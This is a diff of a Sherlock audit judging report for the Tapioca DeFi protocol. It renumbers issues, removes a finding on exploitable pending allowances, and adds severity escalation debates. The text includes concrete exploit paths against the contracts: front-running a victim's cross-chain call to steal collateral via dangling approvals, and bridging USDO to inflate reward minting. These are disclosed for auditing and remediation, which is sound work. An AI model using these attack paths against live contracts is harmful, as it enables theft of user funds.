+> ```
+> 
+> 
+> The high impact attack vector where USDO bridging is not considered allows an attacker to bridge USDO right before rewards are about to be distributed. This will make `usdoSupply` decrease, making the `_amount` obtained from substracting `usdoSupply` to `totalUsdoDebt` be actually bigger than what it should be. 
+> 
+> In order to better understand the impact of the attack, consider the following scenario:
+> - Currently the protocol has a `totalUsdoDebt` of 1500 USDO and a `usdoSupply` of 1000 USDO. This means that a reward distribution would mint 500 USDO (`totalUsdoDebt` - `usdoSupply`)  to be distributed on twTap. 
+> 
+> 1. An attacker borrows 1000 USDO, thus increasing `totalUsdoDebt` to 2500 USDO, and `usdoSupply` to 2000 USDO. If a reward distribution was to take place now, the amount of USDO to be distributed would still be 500 USDO, because the borrow made `totalUsdoDebt` and `usdoSupply` increase at the same time.
+> 2. The attacker then decides to bridge their 1000 USDO to another chain. This will make `usdoSupply` in the current chain decrease and become 1000 USDO again. However, `totalUsdoDebt` is still 2500 USDO because `totalUsdoDebt` is obtained from the `computeTotalDebt()` function, which as mentioned in my report fetches the debt data from each market's `totalBorrow` variable (a variable that does **NOT** get modified when a bridge takes place)
+> 3. The protocol team decides to execute a reward distribution by calling `mintOpenInterestDebt()`. Although the actual amount that should be minted and distributed is 500 USDO, the real amount that will be minted is 1500 USDO (2500 USDO of `totalUsdoDebt` - 1000 USDO of `usdoSupply`). This makes 1000 more USDO to be minted than the intended.
+> 
+> As mentioned, the severity of this attack should be considered as high because:
+> - An important loss of funds can be produced. An attacker can perform this attack every time a reward distribution takes place (which, [as mentioned in the docs](https://docs.tapioca.xyz/tapioca/token-economy/twtap#rewards), is expected to be performed in weekly epochs), and the attacker is not heavily constrained to perform the attack.
+> - It breaks the core mechanism of the protocol of keeping USDO peg. Because this attack makes the USDO supply be way greater than what is intended, the excess of supply will affect USDO's peg, which should be considered as a high impact for a protocol that plans to release a stablecoin.
+
+You've created a valid escalation!
+
+To remove the escalation from consideration: Delete your comment.
+
+You may delete or edit your escalation comment anytime before the 48-hour escalation window closes. After that, the escalation becomes final.
+
+**cvetanovv**
+
+This issue should remain Medium. You have escalated the report to change from Medium to High, with an additional attack vector that is not described in the main report. 
+When deciding on a severity the main report is looked at, escalations are if a report is not judged correctly. With this escalation, you boost the report with a lot of additions already after the contest is over. 
+I don't know if this is according to Sherlock rules, and if it will be a problem for future decisions when someone can put Medium then read the other reports and get a context to increase his severity to High.
+
+But even if we don't consider what I wrote above, I think it should remain Medium. While the attack is valid the material losses are limited and the attack will only be valid when rewards are about to be distributed. To be a valid High according to Sherlock's rules: "Definite loss of funds without (extensive) limitations of external conditions."
+
+
+**cvetanovv**
+
+Planning to reject the escalation and leave the issue as is.
+
+**Evert0x**
+
+Result:
+Medium
+Unique
+
+**sherlock-admin3**
+
+Escalations have been resolved successfully!
+
+Escalation status:
+- [0xadrii](https://github.com/sherlock-audit/2024-02-tapioca-judging/issues/120/#issuecomment-2032004098): rejected
+
+# Issue M-26: USDO’s MSG_TAP_EXERCISE compose messages where exercised options must be withdrawn to another chain will always fail due to wrongly requiring sendParam's to address to be whitelisted in the Cluster 
 
 Source: https://github.com/sherlock-audit/2024-02-tapioca-judging/issues/124 
 
@@ -4767,7 +6392,7 @@ function exerciseOptionsReceiver(address srcChainSender, bytes memory _data) pub
 
 The protocol team fixed this issue in PR/commit https://github.com/Tapioca-DAO/Tapioca-bar/pull/363.
 
-# Issue M-26: Withdrawing to other chain when exercising options won’t work as expected, leading to DoS 
+# Issue M-27: Withdrawing to other chain when exercising options won’t work as expected, leading to DoS 
 
 Source: https://github.com/sherlock-audit/2024-02-tapioca-judging/issues/125 
 
@@ -5059,7 +6684,7 @@ If users decide to bridge their exercised tapOft, the sendPacket() function inco
 
 The protocol team fixed this issue in PR/commit https://github.com/Tapioca-DAO/Tapioca-bar/pull/376.
 
-# Issue M-27: Not considering fees when wrapping mtOFTs leads to DoS in leverage executors 
+# Issue M-28: Not considering fees when wrapping mtOFTs leads to DoS in leverage executors 
 
 Source: https://github.com/sherlock-audit/2024-02-tapioca-judging/issues/126 
 
@@ -5325,7 +6950,7 @@ Duplicate of https://github.com/sherlock-audit/2024-02-tapioca-judging/issues/46
 
 The protocol team fixed this issue in PR/commit https://github.com/Tapioca-DAO/Tapioca-bar/pull/364.
 
-# Issue M-28: Secondary Big Bang market rates can be manipulated due to not triggering penrose.reAccrueBigBangMarkets(); when leveraging 
+# Issue M-29: Secondary Big Bang market rates can be manipulated due to not triggering penrose.reAccrueBigBangMarkets(); when leveraging 
 
 Source: https://github.com/sherlock-audit/2024-02-tapioca-judging/issues/128 
 
@@ -5427,7 +7052,7 @@ It is recommended to trigger Penrose’s reAccrueBigBangMarkets() function when 
 
 The protocol team fixed this issue in PR/commit https://github.com/Tapioca-DAO/Tapioca-bar/pull/365.
 
-# Issue M-29: `TOFTMarketReceiverModule::marketBorrowReceiver` flow is broken 
+# Issue M-30: `TOFTMarketReceiverModule::marketBorrowReceiver` flow is broken 
 
 Source: https://github.com/sherlock-audit/2024-02-tapioca-judging/issues/137 
 
@@ -5565,7 +7190,7 @@ Review all the allowance mechanisms and ensure that they are correct.
 
 The protocol team fixed this issue in PR/commit https://github.com/Tapioca-DAO/tapioca-periph/commit/0a03bbbd04b30bcac183f1bae24d7f9fe9fd4103#diff-4a6decd451580f83dfe716ed16851529590c8349b1ba9bff97b42248c75e5430.
 
-# Issue M-30: BBLeverage's and SGLLeverage's `buyCollateral()` remove the required funds from the target twice 
+# Issue M-31: BBLeverage's and SGLLeverage's `buyCollateral()` remove the required funds from the target twice 
 
 Source: https://github.com/sherlock-audit/2024-02-tapioca-judging/issues/139 
 
@@ -5887,247 +7512,135 @@ Duplicate of https://github.com/sherlock-audit/2024-02-tapioca-judging/issues/57
 
 The protocol team fixed this issue in PR/commit https://github.com/Tapioca-DAO/Tapioca-bar/pull/367.
 
-# Issue M-31: Pending allowances can be exploited 
+**huuducsc**
 
-Source: https://github.com/sherlock-audit/2024-02-tapioca-judging/issues/140 
+Escalate
+The severity of this issue should be high. Users having allowances for the BigBang or Singularity markets is a very common situation, not a kind of external condition or specific state. It's similar to an allowance attack, which is critical for any protocol.
 
-## Found by 
-GiuseppeDeLaZara, cergyk, duc
-## Summary
+**sherlock-admin2**
 
-Pending allowances can be exploited in multiple places in the codebase.
+> Escalate
+> The severity of this issue should be high. Users having allowances for the BigBang or Singularity markets is a very common situation, not a kind of external condition or specific state. It's similar to an allowance attack, which is critical for any protocol.
 
-## Vulnerability Detail
+You've created a valid escalation!
 
-[`TOFT::marketRemoveCollateralReceiver`](https://github.com/sherlock-audit/2024-02-tapioca/blob/dc2464f420927409a67763de6ec60fe5c028ab0e/TapiocaZ/contracts/tOFT/modules/TOFTMarketReceiverModule.sol#L161) has the following flow:
+To remove the escalation from consideration: Delete your comment.
 
-- It calls `removeCollateral` ona a market with the following parameters: `from = msg_user`, `to = msg_.removeParams.magnetar`.
-- Inside the `SGLCollateral::removeCollateral` `_allowedBorrow` is called and check if the `from = msg_user` address has given enough `allowanceBorrow` to the `msg.sender` which in this case is the TOFT contract. 
-- So for a user to use this flow in needs to call:
-```solidity
-function approveBorrow(address spender, uint256 amount) external returns (bool) {
-        _approveBorrow(msg.sender, spender, amount);
-        return true;
-    }
-```
-- And give the needed allowance to the TOFT contract. 
-- This results in collateral being removed and transferred into the Magnetar contract with [`yieldBox.transfer(address(this), to, collateralId, share);`](https://github.com/sherlock-audit/2024-02-tapioca/blob/dc2464f420927409a67763de6ec60fe5c028ab0e/Tapioca-bar/contracts/markets/singularity/SGLLendingCommon.sol#L57).
-- The Magnetar gets the collateral, and it can withdraw it to any address specified in the [`msg_.withdrawParams`](https://github.com/sherlock-audit/2024-02-tapioca/blob/dc2464f420927409a67763de6ec60fe5c028ab0e/TapiocaZ/contracts/tOFT/modules/TOFTMarketReceiverModule.sol#L195). 
+You may delete or edit your escalation comment anytime before the 48-hour escalation window closes. After that, the escalation becomes final.
 
-This is problematic as the `TOFT::marketRemoveCollateralReceiver` doesn't check the `msg.sender`.
-In practice this means if Alice has called `approveBorrow` and gives the needed allowance with the intention of using the `marketRemoveCollateralReceiver` flow, Bob can use the `marketRemoveCollateralReceiver` flow and withdraw all the collateral from Alice to his address.
+**cvetanovv**
 
-So, any pending allowances from any user can immediately be exploited to steal the collateral. 
+The severity of the potential duplicated issue #60 applies here. In my opinion, it should remain Medium severity because the loss is limited only to the allowance the user has.
+According to Sherlock's [documentation](https://docs.sherlock.xyz/audits/judging/judging#iv.-how-to-identify-a-high-issue) to be High severity: "Definite loss of funds without (extensive) limitations of external conditions."
 
-### Other occurrences
-There are a few other occurrences of this problematic pattern in the codebase.
+**huuducsc**
 
-`TOFT::marketBorrowReceiver` expects the user to give an approval to the Magnetar contract. The approval is expected inside the `_extractTokens` function where `pearlmit.transferFromERC20(_from, address(this), address(_token), _amount);` is called.
-Again, the `msg.sender` is not checked inside the `marketBorrowReceiver` function, so this flow can be abused by another user to borrow and withdraw the borrowed amount to his address. 
+I believe this issue deserves a high severity because approving for the market is a very common behavior among users, which is expected in the workflow of protocol and shouldn't be considered as an external condition. Regarding issue #87, although it requires a difference in decimals of tokens, it is still considered to have a high severity since the sponsor confirmed that they may use different decimals of tokens in the future.
 
-`TOFT::mintLendXChainSGLXChainLockAndParticipateReceiver` also allows to borrow inside the BigBang market and withdraw the borrowed amount to an arbitrary address.
+**cvetanovv**
 
-`TOF::exerciseOptionsReceiver` has the [`_internalTransferWithAllowance`](https://github.com/sherlock-audit/2024-02-tapioca/blob/dc2464f420927409a67763de6ec60fe5c028ab0e/TapiocaZ/contracts/tOFT/modules/TOFTOptionsReceiverModule.sol#L156) function that simply allows to transfer TOFT tokens from any `_options.from` address that has given an allowance to `srcChainSender`, by anyone that calls this function.
-It allows to forcefully call the `exerciseOptionsReceiver` on behalf of any other user. 
+That a user has a maximum allowance is common but not always the case and depends on the user. Losses are limited only to the allowance and funds the user has. 
 
-`USDO::depositLendAndSendForLockingReceiver` also expects the user to give an allowance to the Magnetar contract, i.e. `MagnetarAssetXChainModule::depositYBLendSGLLockXchainTOLP` calls the `_extractTokens`. 
-
-## Impact
-
-The impact of this vulnerability is that any pending allowances from any user can immediately be exploited to steal the collateral/borrowed amount.
-
-## Code Snippet
-- https://github.com/sherlock-audit/2024-02-tapioca/blob/dc2464f420927409a67763de6ec60fe5c028ab0e/TapiocaZ/contracts/tOFT/modules/TOFTMarketReceiverModule.sol#L161
-- https://github.com/sherlock-audit/2024-02-tapioca/blob/dc2464f420927409a67763de6ec60fe5c028ab0e/TapiocaZ/contracts/tOFT/modules/TOFTMarketReceiverModule.sol#L108
-
-## Tool used
-
-Manual Review
-
-## Recommendation
-There are multiple instances of issues with dangling allowances in the protocol. Review all the allowance flows and make sure it can't be exploited. 
+For this reason, I planned to reject the escalation and leave the issue as it is.
 
 
+**huuducsc**
 
-## Discussion
+@cvetanovv The statement that "the loss is limited to the allowance and funds the user has" is not a feasible reason to downgrade this issue, according to the criteria of Sherlock:
+<img width="707" alt="Screenshot 2024-04-08 at 18 38 55" src="https://github.com/sherlock-audit/2024-02-tapioca-judging/assets/80202717/511409df-5205-4a3f-8b16-beacdd26ab46">
 
-**sherlock-admin4**
+Approval for this own protocol (markets) isn't considered external conditions since most users will approve when using this protocol, and it's commonly expected behavior. In history, there have been several approval attacks which caused huge losses for users and protocols, such as the [Old Dolomite exploit](https://cointelegraph.com/news/old-dolomite-exchange-contract-suffers-1-8-million-loss-from-approval-exploit). 
 
-1 comment(s) were left on this issue during the judging contest.
+Additionally, #87 is still a high issue even when it requires different decimals tokens, which depends on the admin. Therefore, I believe this issue and other issues, which can cause loss from approval for markets, truly deserve high severity.
 
-**takarez** commented:
->  seem invalid to me as the approval is made withing the function call which means user doesn't have to call the said approve function
+**cvetanovv**
 
+Hey @huuducsc, I'm not downgrading this issue as you say. This issue is judged by the Protocol and Lead Judge as Medium with which I agree for now. 
 
+@nevillehuang What do you think? I have to admit it is borderline High/Medium. What makes it Medium in my opinion is the limitation to allowance and the funds it has.
+
+On the other hand, unsuspecting users can give a lot of allowances and have a lot of funds and lose a lot of funds because of this bug. Even hundreds of thousands. So I think there is a reason to upgrade it to High.
+
+**huuducsc**
+
+@cvetanovv 
+> What makes it Medium in my opinion is the limitation to allowance and the funds it has.
+
+When users are not aware of this vulnerability, they may approve millions or infinite funds to the protocol after its launch. As I mentioned, most users will routinely approve for markets when using this protocol because it's expected behavior from both protocol and users. The limitation of possible lost funds depends on users, but it will still be very huge on a regular basis. Therefore, there is no reason to consider this issue as medium severity, based on Sherlock's criteria, since it doesn't require any external conditions
 
 **nevillehuang**
 
-request poc
+@maarcweiss @cryptotechmaker Could you let us know why you believe this issue is medium severity?
+
+**0xRektora**
+
+I also think It's borderline a high/medium because at the end it's gonna depend on the approval. We integrated a new approval system on Tapioca right before the audit start that takes in a permit for each transaction, there's no infinite approvals. The values are equal to the amounts needed and can't be updated by the web3 wallet because it's a permit.
+
+If we take this into context I'd see it as a medium and not a high because the likelihood would be low.
+
+**cvetanovv**
+
+After this additional information from @0xRektora I decided to keep my original decision to reject the escalation and this issue will remain Medium.
+
+**huuducsc**
+
+> We integrated a new approval system on Tapioca right before the audit start that takes in a permit for each transaction
+
+This statement wasn't mentioned in the contest's docs, so I believe it is out of scope and shouldn't be taken into context. Additionally, I believe this cannot prevent users from approving for markets, since the protocol didn't have any rules or docs to restrict user approval, so the likelihood should be high.
+
+**cvetanovv**
+
+I agree with the @huuducsc escalation and will upgrade the severity to High. 
+
+An unsuspecting user may have a lot of permission and since funds will always be double removed then High severity is appropriate.
+
+**0xadrii**
+
+In response to [Duc's comment](https://github.com/sherlock-audit/2024-02-tapioca-judging/issues/139#issuecomment-2046625097), I believe that Rektora is referring to the Pearlmit approval system, which could clearly be found in the [contracts in-scope](https://github.com/sherlock-audit/2024-02-tapioca-0xadrii/blob/main/Tapioca-bar/contracts/Penrose.sol#L36), and was also explicitly mentioned by the sponsors as one of the breaking changes for this audit in [this comment on Sherlock's official tapioca discord channel](https://ptb.discord.com/channels/812037309376495636/1210627002982207499/1211689249280368730). Just want to clarify that this approval system must not be considered out of scope given that it is one of the essential additions for this audit
+
+**cvetanovv**
+
+If we consider the new approval system then things change. So my last decision is to take into consideration [sponsor](https://github.com/sherlock-audit/2024-02-tapioca-judging/issues/139#issuecomment-2045788465) and @0xadrii comment and reject the escalation.
+
+**huuducsc**
+
+@cvetanovv
+> Just want to clarify that this approval system must not be considered out of scope given that it is one of the essential additions for this audit
+
+ I agree with @0xadrii that the permit system is not out of scope, but he just wanted to clarify it and he didn't point out any consideration of this issue as a medium. My demonstration for considering it a high severity is that there is no statement in the docs which restricts the approval from users to protocol. The protocol didn't tell users to only use the permit functionality, so I believe the likelihood of this issue is still high since it doesn't need any external condition.
+
+**0xadrii**
+
+Well, I did not mention it but my comment was actually meant to support [the sponsor's comment](https://github.com/sherlock-audit/2024-02-tapioca-judging/issues/139#issuecomment-2045788465) and make it clear that the permit integration must be considered for this audit. The sponsor's comment shows how likelihood is clearly  low and hence medium severity is justified 
+
+**huuducsc**
+
+@0xadrii I mean the sponsor only mentioned a functionality of permit and didn't show any evidence to consider the likelihood as low. I still don't know why approval for the market should be considered as low likelihood since there are no restrictions for it in the protocol's docs
+
+
+**cvetanovv**
+
+My final decision is to reject the escalation and this issue will remain Medium.
+
+**Evert0x**
+
+Result:
+Medium
+Has Duplicates
 
 **sherlock-admin3**
 
-PoC requested from @windhustler
+Escalations have been resolved successfully!
 
-Requests remaining: **2**
-
-**windhustler**
-
-Let's imagine Alice has some collateral inside the Singularity Market on Avalanche. 
-
-She wants to remove that collateral and initiates a transaction from Ethereum. 
-
-Her transaction on Avalanche will call `TOFTMarketReceiverModule::marketRemoveCollateralReceiver` where `Market::removeCollateral` through `IMarket(msg_.removeParams.market).execute(modules, calls, true);`is called.
-
-```solidity
-## SGLCollateral.sol
-
-function removeCollateral(address from, address to, uint256 share)
-        external
-        optionNotPaused(PauseType.RemoveCollateral)
-        solvent(from, false)
-        allowedBorrow(from, share)
-        notSelf(to)
-    {
-        _removeCollateral(from, to, share);
-    }
-
-/**
-* @inheritdoc MarketERC20
-     */
-    function _allowedBorrow(address from, uint256 share) internal virtual override {
-        if (from != msg.sender) {
-            // TODO review risk of using this
->>>            (uint256 pearlmitAllowed,) = penrose.pearlmit().allowance(from, msg.sender, address(yieldBox), collateralId); // Alice needs to give allowance to TOFT
->>>            require(allowanceBorrow[from][msg.sender] >= share || pearlmitAllowed >= share, "Market: not approved"); // Alice needs to give allowance to TOFT.
-            if (allowanceBorrow[from][msg.sender] != type(uint256).max) {
-                allowanceBorrow[from][msg.sender] -= share;
-            }
-        }
-    }
-
-    
-
-    function _removeCollateral(address from, address to, uint256 share) internal {
-        userCollateralShare[from] -= share;
-        totalCollateralShare -= share;
-        emit LogRemoveCollateral(from, to, share);
-        yieldBox.transfer(address(this), to, collateralId, share);
-    }
-```
-
-- Remove collateral is called with `msg.sender = TOFT`, `from = Alice`, `to = Magnetar`, and `share = 10`;
-- And then Magnetar withdraws the collateral on another chain to Alice's address or any other address that is set in `MagnetarWithdrawData.LzSendParams.SendParam.to`, i.e. this can be any address. 
-
-So prerequisite for this flow to work is that Alice has:
-
-a) Given allowance to the TOFT contract through the Pearlmit contract.
-b) Given the allowance to the TOFT contract through the `allowanceBorrow` function.
-
-In other words, Alice needs to call in a separate transaction:
-
-```solidity
-Singularity.approveBorrow(TOFT, 10)
-```
-
-and
-
-```solidity
-PermiC.approve(address(yieldBox), collateralId, address(TOFT), 10, block.timestamp + 1 hour);
-```
-
-But if Alice has ever given the two allowances listed above, Bob can front-run Alice's `TOFTMarketReceiverModule::marketRemoveCollateralReceiver` transaction and just call it with the following params:
-
-- `from =  Alice` 
-- `MagnetarWithdrawData.LzSendParams.SendParam.to = Bob`
-- As a consequence, Bob will steal Alice's collateral.
-
-This is possible due to two reasons:
-
-```solidity
-## TOFTMarketReceiverModule.sol
-{
-            uint256 share = IYieldBox(ybAddress).toShare(assetId, msg_.removeParams.amount, false);
->>>            approve(msg_.removeParams.market, share);
-
-            (Module[] memory modules, bytes[] memory calls) = IMarketHelper(msg_.removeParams.marketHelper)
-                .removeCollateral(msg_.user, msg_.withdrawParams.withdraw ? msg_.removeParams.magnetar : msg_.user, share);
-            IMarket(msg_.removeParams.market).execute(modules, calls, true);
-        }
-```
-- This `approve` is useless here. In the normal cross-chain call the `msg.sender` is the lzEndpoint so the `approve` does nothing. As I have described approvals should be given separately.
-- `marketRemoveCollateralReceiver` is coded in a way that `msg.sender` is irrelevant which ties to the point above. 
-
-
-To give an analogy, this is almost as Alice giving allowance to UniswapV3 to use her tokens and then Bob can just exploit this allowance to drain Alice's funds.
-It would make sense if Alice has given the allowance to Bob for using her funds, but this is not the case here.
-
-
-Let me know if this makes sense or if you need further clarification.
-
-
-**nevillehuang**
-
-@windhustler This seems to be a duplicate of #31
-
-**windhustler**
-
-#31 Makes the claim if Alice gives the allowance to Bob, he can abuse it under certain conditions. And it specifies a single instance related to `buyCollateral` flow. 
-
-My issue makes the claim that if Alice gives allowance to TOFT to execute a simple cross-chain flow, i.e.[TOFT::marketRemoveCollateralReceiver](https://github.com/sherlock-audit/2024-02-tapioca/blob/dc2464f420927409a67763de6ec60fe5c028ab0e/TapiocaZ/contracts/tOFT/modules/TOFTMarketReceiverModule.sol#L161), Bob can come along and steal all the collateral from Alice. It's quite different as Alice hasn't given any allowance to Bob at all. It makes the impact and mitigation different. 
-
-My issue also states **several other occurrences** that are similar in nature.
-
-**nevillehuang**
-
-@cryptotechmaker What do you think? I think this could be the primary issue and #31 and duplicates could be duplicated. Would the mitigation be different between these issues?
-
-**cryptotechmaker**
-
-@nevillehuang wouldn't this one and #19 be more or less duplicates? 
-
-These are the PRs I did for 19, which might solve it as well
-
-https://github.com/Tapioca-DAO/Tapioca-bar/pull/348
-
-https://github.com/Tapioca-DAO/TapiocaZ/pull/172
-
-**cryptotechmaker**
-
-Issue #137 is similar as well with the difference that 137 mentioned about some missing approvals. However it's still related to the allowance system
-
-**nevillehuang**
-
-@cryptotechmaker Here are the issues related to allowances that seems very similar:
-
-#19 
-#31
-#137
-#140
-
-Finding it hard to decide on duplication, will update again. Are the fixes similar in these issues?
-
-**cryptotechmaker**
-
-@nevillehuang  I would add https://github.com/sherlock-audit/2024-02-tapioca-judging/issues/134 on that list as well
-
-**cryptotechmaker**
-
-We'll analyze them this week but yes, I think those are duplicates
-
-**nevillehuang**
-
-@cryptotechmaker I believe
-
-#19 to be a duplicate of #134
-#31 to be a duplicate of #140
-#137 Separate issue
+Escalation status:
+- [huuducsc](https://github.com/sherlock-audit/2024-02-tapioca-judging/issues/139/#issuecomment-2031944515): rejected
 
 # Issue M-32: Allowances is double spent in BBLeverage's and SGLLeverage's `sellCollateral()` 
 
 Source: https://github.com/sherlock-audit/2024-02-tapioca-judging/issues/141 
 
 ## Found by 
-duc, hyh
+hyh
 ## Summary
 
 Both `sellCollateral()` functions remove allowance twice, before and after target debt size control.
@@ -6369,6 +7882,58 @@ All other `_repay()` calls should by default use `checkAllowance == true`.
 **sherlock-admin4**
 
 The protocol team fixed this issue in PR/commit https://github.com/Tapioca-DAO/Tapioca-bar/pull/368.
+
+**dmitriia**
+
+Escalate
+Allowance double spending without material prerequisites implies fund loss with a high probability. Allowance mechanics in question gives an ability to extract the collateral, i.e. is a direct equivalent of funds. On these grounds the issue should have high severity as described.
+
+**sherlock-admin2**
+
+> Escalate
+> Allowance double spending without material prerequisites implies fund loss with a high probability. Allowance mechanics in question gives an ability to extract the collateral, i.e. is a direct equivalent of funds. On these grounds the issue should have high severity as described.
+
+You've created a valid escalation!
+
+To remove the escalation from consideration: Delete your comment.
+
+You may delete or edit your escalation comment anytime before the 48-hour escalation window closes. After that, the escalation becomes final.
+
+**nevillehuang**
+
+@maarcweiss Could you let us know why you believe this issue should be medium severity?
+
+**cvetanovv**
+
+I agree with @dmitriia escalation. We can upgrade it to High.
+
+**huuducsc**
+
+I don't think this issue meets the criteria for High severity according to Sherlock's criteria. 
+<img width="738" alt="Screenshot 2024-04-12 at 04 57 16" src="https://github.com/sherlock-audit/2024-02-tapioca-judging/assets/80202717/375e5904-e646-478d-aa34-956c0e96d35c">
+
+It involves the allowance of `calldata_.from` for the sender being spent twice, which doesn't directly result in a loss of funds. Instead, it causes the function to revert if the user approves the exact allowance they want to extract in correct behavior. While users may need to approve double allowance for the sender, which is risky, but it doesn't qualify as high severity since the sender is trusted by the user. I believe that the funds of users cannot be exploited without any external conditions, and the report didn't mention any attack path that could cause a loss.
+
+**maarcweiss**
+
+I agree with @huuducsc  on this one, losing allowance and/or reverting on a correct one is important though does not apply as direct loss of funds. I think it should stay as a med. 
+
+**cvetanovv**
+
+I will agree with @maarcweiss and @huuducsc comments and reject the escalation and this issue will remain Medium.
+
+**Evert0x**
+
+Result:
+Medium
+Unique
+
+**sherlock-admin4**
+
+Escalations have been resolved successfully!
+
+Escalation status:
+- [dmitriia](https://github.com/sherlock-audit/2024-02-tapioca-judging/issues/141/#issuecomment-2034569524): rejected
 
 # Issue M-33: Operation residual is lost for the user of BBLeverage's and SGLLeverage's `sellCollateral()` 
 
